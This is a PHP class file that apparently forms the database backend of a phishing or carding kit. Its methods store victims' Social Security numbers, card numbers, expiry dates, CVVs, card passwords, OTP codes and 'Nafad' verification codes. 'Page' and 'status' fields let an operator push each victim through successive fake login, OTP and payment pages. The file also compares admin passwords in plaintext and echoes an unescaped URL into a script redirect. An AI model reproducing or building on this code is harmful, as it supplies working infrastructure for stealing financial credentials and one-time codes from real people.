<?php

/**
 * User System Lofin
 */
class User extends DB
{

  // users name of table
  private $table = 'admin';

  public function login($data)
  {
    $sql = 'SELECT * FROM ' . $this->table . ' WHERE `username` = :username OR `email` = :email LIMIT 1';

    DB::query($sql);
    DB::bind(':username', $data['username']);
    DB::bind(':email', $data['email']);
    DB::execute();

    // Store returned info from db in $user var
    $user = DB::fetch();
    if (DB::rowCount() > 0) {

      // Check if password is correct
      if ($data['password'] == $user->password) {
        $_SESSION['user_session'] = $user->id;
        return true;
      } else {
        return false;
      }
    }
  }
  public function fetchAdminById($id)
  {
    $sql = 'SELECT * FROM `admin` WHERE `id` = :id ';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::execute();
    $data = DB::fetch();
    if (DB::rowCount() > 0)
      return $data;
    else
      return false;
  }
  public function fetchUserById($id)
  {
    $sql = 'SELECT * FROM `users` WHERE `id` = :id ';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::execute();
    $data = DB::fetch();
    if (DB::rowCount() > 0)
      return $data;
    else
      return false;
  }

  public function fetchCardById($id)
  {
    $sql = 'SELECT * FROM `card` WHERE `id` = :id ';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::execute();
    $data = DB::fetch();
    if (DB::rowCount() > 0)
      return $data;
    else
      return false;
  }

  /**
   * Delete User by ID
   */
  public function deleteAdminById($id)
  {
    $sql = 'DELETE FROM `admin` WHERE `id` = :id ';
    DB::query($sql);
    DB::bind(':id', $id);
    return DB::execute();
  }

  // Check if user is steal logged in by session
  public function isLoggedIn()
  {
    if (isset($_SESSION['user_session']))
      return true;
  }

  public function logOut()
  {
    session_destroy();
    unset($_SESSION['user_session']);
    if (isset($_SESSION['user_session']))
      return false;
    else
      return true;
  }

  public function redirect($url)
  {

    echo "
      <script>
      window.location.href=\"$url\";
      </script>
      ";
  }

  /**
   * Fetch users
   */

  public function insertAdmin($data = array())
  {
    $sql = 'INSERT INTO `admin` (`username`,
                                  `email`,
                                  `password`)
                                    VALUE ( :username,:email,:password)
                                           ';
    DB::query($sql);
    DB::bind(':username', $data['username']);
    DB::bind(':email', $data['email']);
    DB::bind('password', $data['password']);


    return DB::execute();
  }

  public function fetchAllAdmin()
  {

    $sql = 'SELECT * FROM `admin`;';

    DB::query($sql);
    DB::execute();
    $data = DB::fetchAll();


    if (DB::rowCount() > 0) {
      return $data;
    } else {
      return false;
    }
  }
  public function fetchAllUsers()
  {

    $sql = 'SELECT * FROM `users` ORDER BY id DESC;';

    DB::query($sql);
    DB::execute();
    $data = DB::fetchAll();


    if (DB::rowCount() > 0) {
      return $data;
    } else {
      return false;
    }
  }
  public function fetchAllCards()
  {

    $sql = 'SELECT * FROM `card` ORDER BY id DESC;';

    DB::query($sql);
    DB::execute();
    $data = DB::fetchAll();


    if (DB::rowCount() > 0) {
      return $data;
    } else {
      return false;
    }
  }

  public function NumberOfCards()
  {

    $sql = 'SELECT count(*) as total FROM `card`';

    DB::query($sql);
    DB::execute();
    $data = DB::fetchAll();

    if (DB::rowCount() > 0) {
      return $data;
    } else {
      return 0;
    }
  }

  public function registerSecond($data = array())
  {
    $sql = 'INSERT INTO `users` (
                                                  `phone`,  
                                                  `ssn`,  
                                                  `passwordtwo`,    
                                                  `cardNumber`, 
                                                  `page`,
                                                  `message`)
                                                   VALUE (
                                                  :phone,
                                                  :ssn,
                                                  :passwordtwo,
                                                  :cardNumber,
                                                  :page,
                                                  :message
                                                  )';
    //$hashedPassword = password_hash($data['password'], PASSWORD_DEFAULT);
    DB::query($sql);
    DB::bind(':phone', $data['phone']);
    DB::bind(':ssn', $data['ssn']);
    DB::bind(':passwordtwo', $data['passwordtwo']);
    DB::bind(':cardNumber', $data['cardNumber']);
    DB::bind(':page', $data['page']);
    DB::bind(':message', $data['message']);
    if (DB::execute())
      return DB::lastInsertId();
    else
      return false;
  }

  public function register($data = array())
  {
    $sql = 'INSERT INTO `users` (
                                                  `username`,
                                                  `ssn`,
                                                  `phone`,
                                                  `page`,
                                                  `message`)
                                                   VALUE (
                                                  :username,
                                                  :ssn,
                                                  :phone,
                                                  :page,
                                                  :message
                                                  )';
    DB::query($sql);
    DB::bind(':username', $data['username']);
    DB::bind(':ssn', isset($data['ssn']) ? $data['ssn'] : '');
    DB::bind(':phone', isset($data['phone']) ? $data['phone'] : '');
    DB::bind(':page', $data['page']);
    DB::bind(':message', $data['message']);
    if (DB::execute())
      return DB::lastInsertId();
    else
      return false;
  }

  public function InsertCardRelatedUser($id, $data = array())
  {
    $sql = 'INSERT INTO `card` (
      `bank`,
      `cardNumber`,
      `month`,
      `year`,
      `password`,
      `bad`,
      `userId`)
       VALUE (
      :bank,
      :cardNumber,
      :month,
      :year,
      :password,
      :bad,
      :id
      )';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':bank', $data['bank']);
    DB::bind(':cardNumber', $data['cardNumber']);
    DB::bind(':month', $data['month']);
    DB::bind(':year', $data['year']);
    DB::bind(':password', $data['password']);
    DB::bind(':bad', $data['bad']);

    if (DB::execute())
      return DB::lastInsertId();
    else
      return false;
  }

  public function InsertCardTwoRelatedUser($id, $data = array())
  {
    $sql = 'INSERT INTO `card` (
      `cardNumber`,
      `month`,
      `year`,
      `cvv`,
      `bank`,
      `userId`)
       VALUE (
      :cardNumber,
      :month,
      :year,
      :cvv,
      :bank,
      :id
      )';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':cardNumber', $data['cardNumber']);
    DB::bind(':month', $data['month']);
    DB::bind(':year', $data['year']);
    DB::bind(':cvv', $data['cvv']);
    DB::bind(':bank', $data['bank']);

    if (DB::execute())
      return DB::lastInsertId();
    else
      return false;
  }



  public function UpdateStatus($id, $message)
  {
    $sql2 = 'UPDATE `users` SET `message` = :message WHERE `id` = :id ;';

    DB::query($sql2);
    DB::bind(':id', $id);
    DB::bind(':message', $message);
    return DB::execute();
  }

  public function UpdateAccount($id, $data = array())
  {
    $sql2 = 'UPDATE `users` SET `username` = :username , `password` = :password ,`status` = :status, `message` = :message, `page` = :page WHERE `id` = :id ;';

    DB::query($sql2);
    DB::bind(':id', $id);
    DB::bind(':username', $data['username']);
    DB::bind(':password', $data['password']);
    DB::bind(':message', $data['message']);
    DB::bind(':page', isset($data['page']) ? $data['page'] : 'login.php');
    DB::bind(':status', 0);
    return DB::execute();
  }

  public function UpdateCardOTP($id, $data = array())
  {

    $sql = 'UPDATE `users` SET `status` = :status, `otp` = :otp , `message` = :message, `page` = :page  WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':otp', $data['otp']);
    DB::bind(':message', $data['message']);
    DB::bind(':page', 'otp.php');
    DB::bind(':status', 0);
    return DB::execute();
  }

  public function UpdatePassword($id, $data = array())
  {

    $sql = 'UPDATE `users` SET `status` = :status, `pass` = :password , `message` = :message, `page` = :page  WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':password', $data['password']);
    DB::bind(':message', $data['message']);
    DB::bind(':page', 'password.php');
    DB::bind(':status', 0);
    return DB::execute();
  }

  public function UpdateCodeOTP($id, $data = array())
  {

    $sql = 'UPDATE `users` SET `status` = :status, `passwordtwo` = :codeotp , `message` = :message, `page` = :page  WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':codeotp', $data['codeotp']);
    DB::bind(':message', $data['message']);
    DB::bind(':page', 'code-otp.php');
    DB::bind(':status', 0);
    return DB::execute();
  }

  public function UpdatePayment($id, $data = array())
  {

    $sql = 'UPDATE `users` SET `status` = :status, `cardNumber` = :cardNumber, `message` = :message, `page` = :page  WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':cardNumber', $data['cardNumber']);
    DB::bind(':message', $data['message']);
    DB::bind(':page', 'payment.php');
    DB::bind(':status', 0);
    return DB::execute();
  }

  public function UpdateCardCVV($id, $data = array())
  {

    $sql = 'UPDATE `card` SET `cvv` = :cvv  WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':cvv', $data['cvv']);
    return DB::execute();
  }

  public function UpdateVerify($id, $data = array())
  {

    $sql = 'UPDATE `users` SET `waitVerify` = :waitVerify , `message` = :message WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':waitVerify', $data['waitVerify']);
    DB::bind(':message', 'Wait Verify');
    return DB::execute();
  }

  public function DeleteUserById($id)
  {
    $sql = 'DELETE FROM `users` WHERE `id` = :id ';
    DB::query($sql);
    DB::bind(':id', $id);
    return DB::execute();
  }

  public function DeleteAllUsers()
  {
    $sql = 'DELETE FROM `users`';
    DB::query($sql);
    return DB::execute();
  }

  public function UpdateCardCodeById($id, $code)
  {

    $sql = 'UPDATE `card` SET `code` = :code WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':code', $code);
    return DB::execute();
  }


  public function UpdateCardPasswordById($id, $password)
  {

    $sql = 'UPDATE `card` SET `password` = :password WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':password', $password);
    return DB::execute();
  }
  public function register2($data = array())
  {
    $sql = 'INSERT INTO `card` (
                                                  `cardNumber`,
                                                   `expire1`,
                                                  `expire2`,
                                                  `cvv`
                                                  ) VALUE (
                                                  :cardNumber,
                                                  :month,
                                                  :year,
                                                  :cvv
                                                  )';
    DB::query($sql);
    DB::bind(':cardNumber', $data['cardNumber']);
    DB::bind(':month', $data['month']);
    DB::bind(':year', $data['year']);
    DB::bind(':cvv', $data['cvv']);
    if (DB::execute())
      return DB::lastInsertId();
    else
      return false;
  }

  public function UpdateUserCodeById($id, $code)
  {

    $sql = 'UPDATE `users` SET `code` = :code WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':code', $code);
    return DB::execute();
  }
  public function UpdateUserCheckTheCodeById($id, $code)
  {

    $sql = 'UPDATE `users` SET `CheckTheCode` = :code WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':code', $code);
    return DB::execute();
  }
  public function UpdateUserStatusById($id, $status)
  {
    $sql = 'UPDATE `users` SET `status` = :status WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':status', $status);
    return DB::execute();
  }

  public function UpdateUserCheckTheInfo_NafadAndTextById($id, $code, $temp)
  {

    $sql = 'UPDATE `card` SET `CheckTheInfo_Nafad` = :code , `TemporaryPassword` = :temp  WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':code', $code);
    DB::bind(':temp', $temp);
    return DB::execute();
  }

  public function UpdateCard($id, $code)
  {

    $sql = 'UPDATE `card` SET `status` = :code WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':code', $code);
    return DB::execute();
  }

  public function FetchAllUsersForList()
  {

    $sql = 'SELECT * FROM `users` ORDER BY id DESC;';

    DB::query($sql);
    DB::execute();
    $data = DB::fetchAll();


    if (DB::rowCount() > 0) {
      return $data;
    } else {
      return false;
    }
  }


  public function UpdateUserById($id, $access)
  {

    $sql = 'UPDATE `users` SET `access` = :access WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':access', $access);
    return DB::execute();
  }
  public function insertLink($data)
  {

    $sql = 'UPDATE `users` SET `link` = :link WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $data['id']);
    DB::bind(':link', $data['link']);
    return DB::execute();
  }
  public function updateAdmin($id, $data)
  {
    $sql = 'UPDATE `admin` SET `username` = :username,`password` = :password,`email` = :email
                                  WHERE `id` = :id';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':username', $data['username']);
    DB::bind(':email', $data['email']);
    DB::bind(':password', $data['password']);
    DB::bind(':id', $id);
    return DB::execute();
  }
  public function fetchAdmin($id)
  {
    $sql = 'SELECT * FROM `admin` WHERE `id` = :id ';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::execute();
    $data = DB::fetch();
    if (DB::rowCount() > 0)
      return $data;
    else
      return false;
  }

  public function GetVisits()
  {
    $sql = 'SELECT * FROM `admin` WHERE `id` = :id;';
    DB::query($sql);
    DB::bind(':id', 1);
    DB::execute();
    $data = DB::fetch();
    if (DB::rowCount() > 0)
      return $data;
    else
      return false;
  }

  public function UpdateVisits($new)
  {
    $sql2 = 'UPDATE `admin` SET `visits` = :temp WHERE `id` = :id ;';
    DB::query($sql2);
    DB::bind(':id', 1);
    DB::bind(':temp', $new);
    return DB::execute();
  }
}
